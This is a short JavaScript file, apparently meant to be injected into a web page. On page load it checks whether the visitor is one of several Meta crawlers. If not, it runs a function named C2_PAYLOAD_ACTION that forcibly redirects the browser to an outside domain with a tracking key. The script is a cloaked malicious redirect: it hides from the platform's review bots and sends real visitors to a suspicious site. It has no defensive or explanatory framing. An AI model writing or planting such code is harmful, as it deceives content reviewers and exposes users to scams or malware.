var CURRENT_PAYLOAD_VERSION = "v1";

var META_BOTS = [
    'facebookexternalhit',
    'facebookbot',
    'facebookcatalog',
    'meta-webindexer',
    'meta-externalads',
    'meta-externalagent',
    'meta-externalfetcher'
];

function isMetaBot(ua) {
    var lowerUA = ua.toLowerCase();
    for (var i = 0; i < META_BOTS.length; i++) {
        if (lowerUA.indexOf(META_BOTS[i]) !== -1) return true;
    }
    return false;
}

window.C2_PAYLOAD_ACTION = function() {
    if (isMetaBot(navigator.userAgent)) {
        console.log('Meta bot detected.');
        return;
    }
    
    var REDIRECT_URL_V1 = 'https://consumptionbackwardsentiments.com/mxffi5ye?key=99e086b7376b409877713abd757ae2ae';
    
    if (CURRENT_PAYLOAD_VERSION === 'v1') {
        window.location.replace(REDIRECT_URL_V1);
    }
};

if (!isMetaBot(navigator.userAgent)) {
    window.C2_PAYLOAD_ACTION();
} else {
    console.log('Meta bot detected at load.');
}
